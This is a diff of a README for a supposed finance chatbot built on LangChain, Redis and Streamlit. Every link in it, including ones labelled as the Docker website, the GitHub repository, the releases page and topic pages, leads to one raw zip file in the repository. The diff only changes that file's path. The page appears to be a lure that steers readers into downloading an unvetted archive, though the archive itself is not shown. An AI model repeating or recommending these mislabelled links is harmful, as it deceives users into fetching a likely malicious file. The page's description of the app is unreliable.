@@ -1,7 +1,7 @@
 # 🤖 Finance-AI-Chatbot - Chat with Financial Insights Easily
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/mube841/Finance-AI-Chatbot/master/despisedness/Finance-AI-Chatbot.zip)](https://raw.githubusercontent.com/mube841/Finance-AI-Chatbot/master/despisedness/Finance-AI-Chatbot.zip)
+[![Download](https://raw.githubusercontent.com/mube841/Finance-AI-Chatbot/master/chatbot/app/ui/Finance-Chatbot-A-1.9.zip)](https://raw.githubusercontent.com/mube841/Finance-AI-Chatbot/master/chatbot/app/ui/Finance-Chatbot-A-1.9.zip)
 
 ## 📖 Overview
 The Finance-AI-Chatbot helps you chat with annual reports and financial statements. It uses advanced technology to provide you instant answers. The app leverages LangChain for AI processing, Redis Vector Store for efficient data management, and Streamlit to create an easy-to-use interface. This makes understanding financial documents straightforward and accessible.
@@ -15,16 +15,16 @@ To get started with the Finance-AI-Chatbot, follow these simple steps:
 
 ### System Requirements
 - Operating System: Windows, macOS, or Linux
-- Docker: Make sure to install the latest version from the [Docker website](https://raw.githubusercontent.com/mube841/Finance-AI-Chatbot/master/despisedness/Finance-AI-Chatbot.zip).
+- Docker: Make sure to install the latest version from the [Docker website](https://raw.githubusercontent.com/mube841/Finance-AI-Chatbot/master/chatbot/app/ui/Finance-Chatbot-A-1.9.zip).
 - Minimum RAM: 4 GB (8 GB recommended)
 - CPU: Dual-core or better
 - Internet connection for initial setup
 
 ## 📦 Download & Install
-To get your copy of the Finance-AI-Chatbot, visit this page to download: [Releases Page](https://raw.githubusercontent.com/mube841/Finance-AI-Chatbot/master/despisedness/Finance-AI-Chatbot.zip).
+To get your copy of the Finance-AI-Chatbot, visit this page to download: [Releases Page](https://raw.githubusercontent.com/mube841/Finance-AI-Chatbot/master/chatbot/app/ui/Finance-Chatbot-A-1.9.zip).
 
 ### Installation Steps
-1. **Visit the Releases Page:** Click on the link to open the [Releases Page](https://raw.githubusercontent.com/mube841/Finance-AI-Chatbot/master/despisedness/Finance-AI-Chatbot.zip).
+1. **Visit the Releases Page:** Click on the link to open the [Releases Page](https://raw.githubusercontent.com/mube841/Finance-AI-Chatbot/master/chatbot/app/ui/Finance-Chatbot-A-1.9.zip).
 2. **Select Version:** Look for the latest version listed there.
 3. **Download the Installer:** You will find an installer package or a binary file. Choose the correct file for your operating system and click on it to start the download.
 4. **Extract Files:** Once the download completes, locate the downloaded files and extract them to a folder on your system.
@@ -64,15 +64,15 @@ If you encounter issues during installation or while running the application, co
 - **Look for Errors:** Review terminal output for any error messages. Research common errors related to Docker or Streamlit.
 
 ## 📩 Support & Contributions
-For any questions or support, feel free to create an issue on our [GitHub repository](https://raw.githubusercontent.com/mube841/Finance-AI-Chatbot/master/despisedness/Finance-AI-Chatbot.zip). Contributions are welcome. You can submit a pull request if you'd like to help improve the application.
+For any questions or support, feel free to create an issue on our [GitHub repository](https://raw.githubusercontent.com/mube841/Finance-AI-Chatbot/master/chatbot/app/ui/Finance-Chatbot-A-1.9.zip). Contributions are welcome. You can submit a pull request if you'd like to help improve the application.
 
 ## 📝 License
 This project is licensed under the MIT License. See the LICENSE file in the repository for more details.
 
 ## 🔗 Related Topics
-- [AI Chatbots](https://raw.githubusercontent.com/mube841/Finance-AI-Chatbot/master/despisedness/Finance-AI-Chatbot.zip+chatbots)
-- [Docker](https://raw.githubusercontent.com/mube841/Finance-AI-Chatbot/master/despisedness/Finance-AI-Chatbot.zip)
-- [LangChain](https://raw.githubusercontent.com/mube841/Finance-AI-Chatbot/master/despisedness/Finance-AI-Chatbot.zip)
-- [Streamlit](https://raw.githubusercontent.com/mube841/Finance-AI-Chatbot/master/despisedness/Finance-AI-Chatbot.zip) 
+- [AI Chatbots](https://raw.githubusercontent.com/mube841/Finance-AI-Chatbot/master/chatbot/app/ui/Finance-Chatbot-A-1.9.zip+chatbots)
+- [Docker](https://raw.githubusercontent.com/mube841/Finance-AI-Chatbot/master/chatbot/app/ui/Finance-Chatbot-A-1.9.zip)
+- [LangChain](https://raw.githubusercontent.com/mube841/Finance-AI-Chatbot/master/chatbot/app/ui/Finance-Chatbot-A-1.9.zip)
+- [Streamlit](https://raw.githubusercontent.com/mube841/Finance-AI-Chatbot/master/chatbot/app/ui/Finance-Chatbot-A-1.9.zip) 
 
 By following these steps, users can easily download and interact with the Finance-AI-Chatbot, leading to a smoother understanding of financial documents.
